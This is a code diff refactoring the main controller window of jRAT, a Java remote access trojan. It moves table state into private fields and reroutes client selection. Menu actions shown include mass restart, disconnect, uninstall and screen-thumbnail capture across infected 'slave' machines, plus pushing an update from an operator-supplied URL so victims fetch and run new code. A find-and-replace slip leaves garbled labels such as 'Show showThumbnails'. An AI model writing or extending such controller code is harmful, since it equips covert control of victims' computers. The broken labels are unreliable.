@@ -13,10 +13,7 @@ import java.net.URI;
 import java.util.ArrayList;
 import java.util.List;
 
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
-import javax.swing.JButton;
 import javax.swing.JCheckBoxMenuItem;
 import javax.swing.JFileChooser;
 import javax.swing.JFrame;
@@ -24,19 +21,13 @@ import javax.swing.JMenu;
 import javax.swing.JMenuBar;
 import javax.swing.JMenuItem;
 import javax.swing.JOptionPane;
-import javax.swing.JPanel;
 import javax.swing.JPopupMenu;
-import javax.swing.JSeparator;
 import javax.swing.JTabbedPane;
 import javax.swing.JTable;
-import javax.swing.JToolBar;
-import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.border.EmptyBorder;
 import javax.swing.event.ChangeEvent;
 import javax.swing.event.ChangeListener;
 import javax.swing.event.PopupMenuEvent;
 import javax.swing.event.PopupMenuListener;
-import javax.swing.table.DefaultTableModel;
 
 import jrat.api.RATMenuItem;
 import jrat.api.RATObject;
@@ -78,23 +69,19 @@ import se.jrat.client.utils.Utils;
 import se.jrat.common.Version;
 import se.jrat.common.utils.DataUnits;
 import se.jrat.common.utils.IOUtils;
-import java.awt.BorderLayout;
 
-@SuppressWarnings({ "serial" })
+@SuppressWarnings("serial")
 public class Frame extends BaseFrame {
 
-	private JPanel contentPane;
+	public static final int PING_ICON_DOT = 0;
+	public static final int PING_ICON_CIRCLE = 1;
+
 	private JTabbedPane tabbedPane;
 
-	public DefaultTableModel log;
+	private int pingMode;
+	private boolean showThumbnails;
+	private TrayIcon trayIcon;
 
-	public static JTable mainTable;
-	public static DefaultTableModel mainModel;
-	public static DefaultTableModel onConnectModel;
-	public static TrayIcon trayIcon;
-	public static int pingmode = Frame.PING_ICON_DOT;
-	public static boolean thumbnails = false;
-	
 	private PanelMainClients panelClients;
 	private PanelMainStats panelStats;
 	private PanelMainNetwork panelNetwork;
@@ -104,9 +91,6 @@ public class Frame extends BaseFrame {
 	private PanelMainPlugins panelPlugins;
 
 	private JPopupMenu popupMenu;
-
-	public static final int PING_ICON_DOT = 0;
-	public static final int PING_ICON_CIRC = 1;
 
 	private JMenu mnPlugins;
 	private JCheckBoxMenuItem chckbxmntmTransferPluginsIf;
@@ -165,24 +149,24 @@ public class Frame extends BaseFrame {
 		mnShow.add(chckbxmntmShowToolbar);
 		chckbxmntmShowToolbar.setIcon(IconUtils.getIcon("toolbar"));
 
-		JCheckBoxMenuItem mntmShowThumbnails = new JCheckBoxMenuItem("Show Thumbnails");
-		mnShow.add(mntmShowThumbnails);
-		mntmShowThumbnails.addActionListener(new ActionListener() {
+		JCheckBoxMenuItem mntmShowshowThumbnails = new JCheckBoxMenuItem("Show showThumbnails");
+		mnShow.add(mntmShowshowThumbnails);
+		mntmShowshowThumbnails.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				thumbnails = !thumbnails;
+				showThumbnails = !showThumbnails;
 
-				if (thumbnails) {
+				if (showThumbnails) {
 					for (int i = 0; i < Main.connections.size(); i++) {
 						AbstractSlave sl = Main.connections.get(i);
 						if (sl.getThumbnail() == null) {
 							if (sl instanceof Slave) {
-								((Slave)sl).addToSendQueue(new Packet40Thumbnail());
+								((Slave) sl).addToSendQueue(new Packet40Thumbnail());
 							}
 						}
 					}
-					mainTable.setRowHeight(100);
+					panelClients.setRowHeight(100);
 				} else {
-					mainTable.setRowHeight(30);
+					panelClients.resetRowHeight();
 				}
 			}
 		});
@@ -354,8 +338,8 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmMeter = new JMenuItem("Meter");
 		mntmMeter.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				pingmode = Frame.PING_ICON_DOT;
-				mainTable.repaint();
+				setPingMode(Frame.PING_ICON_DOT);
+				repaint();
 			}
 		});
 		mntmMeter.setIcon(IconUtils.getIcon("ping0"));
@@ -364,8 +348,8 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmCircle = new JMenuItem("Circle");
 		mntmCircle.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				pingmode = Frame.PING_ICON_CIRC;
-				mainTable.repaint();
+				setPingMode(Frame.PING_ICON_CIRCLE);
+				repaint();
 			}
 		});
 		mntmCircle.setIcon(IconUtils.getIcon("network-green"));
@@ -418,7 +402,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmResizeOff = new JMenuItem("Resize off");
 		mntmResizeOff.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
+				panelClients.getTable().setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
 			}
 		});
 		mntmResizeOff.setIcon(IconUtils.getIcon("application-resize"));
@@ -427,7 +411,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmFit = new JMenuItem("Fit");
 		mntmFit.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				mainTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
+				panelClients.getTable().setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
 			}
 		});
 		mntmFit.setIcon(IconUtils.getIcon("application-resize"));
@@ -449,7 +433,7 @@ public class Frame extends BaseFrame {
 				} catch (Exception ex) {
 					return;
 				}
-				mainTable.setRowHeight(h);
+				panelClients.setRowHeight(h);
 				Settings.getGlobal().setVal("rowheight", h);
 			}
 		});
@@ -513,10 +497,10 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmSelectX = new JMenuItem("Select X");
 		mntmSelectX.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				if (mainModel.getRowCount() == 0) {
+				if (Main.connections.size() == 0) {
 					return;
 				}
-				String howmany = Utils.showDialog("Select X", "Select how many connections you want to select\n" + mainModel.getRowCount() + " available");
+				String howmany = Utils.showDialog("Select X", "Select how many clients you want to select\n" + Main.connections.size() + " available");
 				if (howmany == null || howmany != null && howmany.length() == 0) {
 					return;
 				}
@@ -527,14 +511,14 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Invalid amount!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				if (many > mainModel.getRowCount()) {
-					JOptionPane.showMessageDialog(null, "You do not have " + many + " connections", "Error", JOptionPane.WARNING_MESSAGE);
+				if (many > Main.connections.size()) {
+					JOptionPane.showMessageDialog(null, "Not enough clients connected", "Error", JOptionPane.WARNING_MESSAGE);
 					return;
 				}
 				for (int i = 0; i < Main.connections.size() && i < many; i++) {
 					Main.connections.get(i).setSelected(true);
 				}
-				mainTable.repaint();
+				repaint();
 			}
 		});
 		mntmSelectX.setIcon(IconUtils.getIcon("select-x"));
@@ -553,13 +537,13 @@ public class Frame extends BaseFrame {
 		mntmRestartAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<AbstractSlave> list = Utils.getSlaves();
+				List<AbstractSlave> list = panelClients.getSelectedSlaves();
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm restarting all connections")) {
-						for (AbstractSlave sl : list) {							
+						for (AbstractSlave sl : list) {
 							if (sl instanceof Slave) {
 								try {
-									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
+									((Slave) sl).addToSendQueue(new Packet37RestartJavaProcess());
 								} catch (Exception ex) {
 									ex.printStackTrace();
 								}
@@ -576,17 +560,17 @@ public class Frame extends BaseFrame {
 		mntmDisconnectAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<AbstractSlave> list = Utils.getSlaves();
+				List<AbstractSlave> list = panelClients.getSelectedSlaves();
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm disconnecting all connections")) {
 						for (AbstractSlave sl : list) {
 							if (sl instanceof Slave) {
 								try {
-									((Slave)sl).addToSendQueue(new Packet11Disconnect());
+									((Slave) sl).addToSendQueue(new Packet11Disconnect());
 								} catch (Exception ex) {
 									ex.printStackTrace();
 								}
-							}					
+							}
 						}
 					}
 				}
@@ -597,13 +581,13 @@ public class Frame extends BaseFrame {
 		mntmReconnectAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				selectAll();
-				List<AbstractSlave> list = Utils.getSlaves();
+				List<AbstractSlave> list = panelClients.getSelectedSlaves();
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm reconnecting all connections")) {
 						for (AbstractSlave sl : list) {
 							if (sl instanceof Slave) {
 								try {
-									((Slave)sl).addToSendQueue(new Packet45Reconnect());
+									((Slave) sl).addToSendQueue(new Packet45Reconnect());
 								} catch (Exception ex) {
 									ex.printStackTrace();
 								}
@@ -622,17 +606,17 @@ public class Frame extends BaseFrame {
 		mntmUninstallAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<AbstractSlave> list = Utils.getSlaves();
+				List<AbstractSlave> list = panelClients.getSelectedSlaves();
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm uninstalling all connections")) {
 						for (AbstractSlave sl : list) {
 							if (sl instanceof Slave) {
 								try {
-									((Slave)sl).addToSendQueue(new Packet36Uninstall());
+									((Slave) sl).addToSendQueue(new Packet36Uninstall());
 								} catch (Exception ex) {
 									ex.printStackTrace();
 								}
-							}				
+							}
 						}
 					}
 				}
@@ -645,9 +629,10 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmUpdateAllOutdated = new JMenuItem("Update all outdated (red)");
 		mntmUpdateAllOutdated.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				if (mainModel.getRowCount() <= 0) {
+				if (Main.connections.size() == 0) {
 					return;
 				}
+				
 				String result = Utils.showDialog("Update from URL", "Input URL to update with");
 				if (result == null) {
 					return;
@@ -659,19 +644,15 @@ public class Frame extends BaseFrame {
 
 				result = result.trim().replace(" ", "%20");
 
-				int servers = 0;
-				for (int i = 0; i < mainModel.getRowCount(); i++) {
-					AbstractSlave sl = Utils.getSlave(mainModel.getValueAt(i, 3).toString());
-					if (sl != null) {
-						if (!sl.getVersion().equals(Version.getVersion())) {
-							if (sl instanceof Slave) { 
-								((Slave)sl).addToSendQueue(new Packet18Update(result));
-							}
-							++servers;
-						}
+				int clients = 0;
+				for (AbstractSlave slave : Main.connections) {
+					if (slave instanceof Slave && !slave.getVersion().equals(Version.getVersion())) {
+						((Slave) slave).addToSendQueue(new Packet18Update(result));
+						++clients;
 					}
+
 				}
-				JOptionPane.showMessageDialog(null, "Updated on " + servers + " outdated connections");
+				JOptionPane.showMessageDialog(null, "Updated on " + clients + " outdated connections");
 			}
 		});
 		mntmUpdateAllOutdated.setIcon(IconUtils.getIcon("update"));
@@ -700,7 +681,7 @@ public class Frame extends BaseFrame {
 		mntmPackPlugin.setIcon(IconUtils.getIcon("plugin-edit"));
 		JMenuItem mntmBrowsePlugins = new JMenuItem("View Available Plugins");
 		mnPlugins.add(mntmBrowsePlugins);
-		
+
 		chckbxmntmTransferPluginsIf = new JCheckBoxMenuItem("Transfer plugins if not installed");
 		chckbxmntmTransferPluginsIf.setSelected(Settings.getGlobal().getBoolean("plugintransfer"));
 		chckbxmntmTransferPluginsIf.addActionListener(new ActionListener() {
@@ -723,19 +704,19 @@ public class Frame extends BaseFrame {
 		JMenu mnOther = new JMenu("Other");
 		menuBar.add(mnOther);
 
-		JMenuItem mntmReloadAllThumbnails = new JMenuItem("Reload all thumbnails");
-		mntmReloadAllThumbnails.setIcon(IconUtils.getIcon("image"));
-		mntmReloadAllThumbnails.addActionListener(new ActionListener() {
+		JMenuItem mntmReloadAllshowThumbnails = new JMenuItem("Reload all showThumbnails");
+		mntmReloadAllshowThumbnails.setIcon(IconUtils.getIcon("image"));
+		mntmReloadAllshowThumbnails.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				for (int i = 0; i < Main.connections.size(); i++) {
 					AbstractSlave sl = Main.connections.get(i);
 					if (sl instanceof Slave) {
-						((Slave)sl).addToSendQueue(new Packet40Thumbnail());
+						((Slave) sl).addToSendQueue(new Packet40Thumbnail());
 					}
 				}
 			}
 		});
-		mnOther.add(mntmReloadAllThumbnails);
+		mnOther.add(mntmReloadAllshowThumbnails);
 
 		JMenu mnAbout = new JMenu("Help");
 		mnAbout.setVisible(true);
@@ -797,7 +778,6 @@ public class Frame extends BaseFrame {
 			}
 		});
 
-
 		popupMenu = new JPopupMenu();
 		popupMenu.addPopupMenuListener(new PopupMenuListener() {
 			public void popupMenuCanceled(PopupMenuEvent arg0) {
@@ -829,7 +809,7 @@ public class Frame extends BaseFrame {
 
 			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
 				try {
-					List<AbstractSlave> list = Utils.getSlaves();
+					List<AbstractSlave> list = panelClients.getSelectedSlaves();
 					if (list.size() == 1) {
 						JMenuItem item = new JMenuItem("Stub V: " + list.get(0).getVersion());
 						JMenuItem item2 = new JMenuItem("Country: " + list.get(0).getCountry().toUpperCase());
@@ -853,7 +833,7 @@ public class Frame extends BaseFrame {
 							}
 						}
 					}
-					mainTable.repaint();
+					repaint();
 				} catch (Exception ex) {
 					// ex.printStackTrace();
 				}
@@ -873,7 +853,7 @@ public class Frame extends BaseFrame {
 
 					item.addActionListener(new ActionListener() {
 						public void actionPerformed(ActionEvent e) {
-							List<AbstractSlave> list = Utils.getSlaves();
+							List<AbstractSlave> list = panelClients.getSelectedSlaves();
 							List<RATObject> servers = new ArrayList<RATObject>();
 							for (int i = 0; i < list.size(); i++) {
 								servers.add(RATObjectFormat.format(list.get(i)));
@@ -894,7 +874,7 @@ public class Frame extends BaseFrame {
 		panelSockets = new PanelMainSockets();
 		panelLog = new PanelMainLog();
 		panelPlugins = new PanelMainPlugins();
-			
+
 		tabbedPane.addTab("Clients", IconUtils.getIcon("tab-main", true), panelClients, null);
 		tabbedPane.addTab("Statistics", IconUtils.getIcon("statistics", true), panelStats, null);
 		tabbedPane.addTab("Network Usage", IconUtils.getIcon("network"), panelNetwork, null);
@@ -904,7 +884,7 @@ public class Frame extends BaseFrame {
 		tabbedPane.addTab("Plugins", IconUtils.getIcon("plugin"), panelPlugins, null);
 
 		reloadPlugins();
-		
+
 		add(tabbedPane);
 	}
 
@@ -954,14 +934,14 @@ public class Frame extends BaseFrame {
 		for (int i = 0; i < Main.connections.size(); i++) {
 			Main.connections.get(i).setSelected(false);
 		}
-		mainTable.repaint();
+		repaint();
 	}
 
 	public void selectAll() {
 		for (int i = 0; i < Main.connections.size(); i++) {
 			Main.connections.get(i).setSelected(true);
 		}
-		mainTable.repaint();
+		repaint();
 	}
 
 	public PanelMainClients getPanelClients() {
@@ -991,8 +971,28 @@ public class Frame extends BaseFrame {
 	public PanelMainLog getPanelLog() {
 		return panelLog;
 	}
-	
+
 	public PanelMainPlugins getPanelPlugins() {
 		return panelPlugins;
+	}
+
+	public boolean showThumbnails() {
+		return showThumbnails;
+	}
+
+	public TrayIcon getTrayIcon() {
+		return trayIcon;
+	}
+
+	public void setTrayIcon(TrayIcon trayIcon) {
+		this.trayIcon = trayIcon;
+	}
+
+	public int getPingMode() {
+		return pingMode;
+	}
+
+	public void setPingMode(int pingMode) {
+		this.pingMode = pingMode;
 	}
 }
